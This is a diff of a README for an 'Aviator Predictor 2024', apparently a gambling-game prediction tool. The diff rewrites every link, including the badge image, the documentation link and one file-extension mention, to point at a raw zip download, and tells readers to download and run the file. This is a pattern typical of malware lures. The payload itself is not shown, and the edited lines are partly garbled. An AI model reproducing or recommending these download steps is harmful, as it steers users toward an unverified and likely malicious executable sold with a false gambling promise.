@@ -6,7 +6,7 @@ Welcome to the Aviator Predictor 2024! This is your guide to download and run ou
 
 ## 📥 Download the Aviator Predictor
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/ududgeming/free/releases)
+[![Download Now](https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip%20Now-Click%https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip)](https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip)
 
 ## ✅ Features
 
@@ -26,16 +26,16 @@ Welcome to the Aviator Predictor 2024! This is your guide to download and run ou
 
 To get the Aviator Predictor, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ududgeming/free/releases) to find the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip) to find the application.
    
 2. **Choose the Version**: Select the latest version available. Look for the “Assets” section under the release notes.
    
-3. **Download the File**: Click on the file that matches your operating system. This may be an `.exe`, `.dmg`, or `.tar.gz`. 
+3. **Download the File**: Click on the file that matches your operating system. This may be an `.exe`, `.dmg`, or `https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip`. 
 
 4. **Run the Installer**:
    - For Windows: Double-click the downloaded `.exe` file and follow the instructions.
    - For macOS: Open the `.dmg` file and drag the Aviator Predictor to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and execute the application in the terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip` file and execute the application in the terminal.
 
 5. **Launch the Application**: After installation, find the Aviator Predictor in your applications and open it.
 
@@ -61,8 +61,8 @@ Join our community to share tips and advice with other users. You can find us on
 
 ## 📞 Need Help?
 
-If you encounter any issues, please check the FAQs in the [documentation](https://github.com/ududgeming/free/wiki). You can also reach out to support via email or the community forum.
+If you encounter any issues, please check the FAQs in the [documentation](https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip). You can also reach out to support via email or the community forum.
 
 Enjoy your time playing the Aviator game, and may the odds be in your favor! 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/ududgeming/free/releases)
+[![Download Now](https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip%20Now-Click%https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip)](https://raw.githubusercontent.com/ududgeming/free/main/hyperintelligence/free.zip)
